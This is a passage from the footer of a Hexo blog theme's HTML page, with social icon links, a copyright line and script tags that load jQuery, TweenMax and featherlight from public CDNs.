                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->



</body>

</html>